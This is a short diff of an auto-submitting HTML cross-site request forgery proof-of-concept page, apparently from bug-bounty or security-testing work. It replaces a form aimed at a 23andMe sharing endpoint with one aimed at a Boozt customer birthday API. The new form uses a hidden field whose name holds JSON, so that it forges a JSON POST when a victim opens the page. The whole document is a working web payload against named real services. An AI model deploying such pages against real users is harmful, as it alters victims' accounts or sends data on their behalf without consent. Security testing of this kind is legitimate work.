@@ -1,14 +1,11 @@
-<!DOCTYPE html>
 <html>
   <body>
-    <h1>CSRF PoC</h1>
-    <form action="https://you.23andme.com/tools/share/" method="POST" id="csrfForm">
-      <input type="hidden" name="email" value="markocp10298@example.com" />
-      <input type="hidden" name="message" value="Check this out" />
-      <!-- Add any fields required by the real endpoint -->
+    <form action="https://www.boozt.com/eu/en/api/customer/birthday" method="POST" enctype="application/json" id="csrfForm">
+      <input type="hidden" name='{"birthday":"1992-02-22"}'>
     </form>
     <script>
-      document.getElementById("csrfForm").submit();
+      document.getElementById('csrfForm').submit();
     </script>
   </body>
 </html>
+
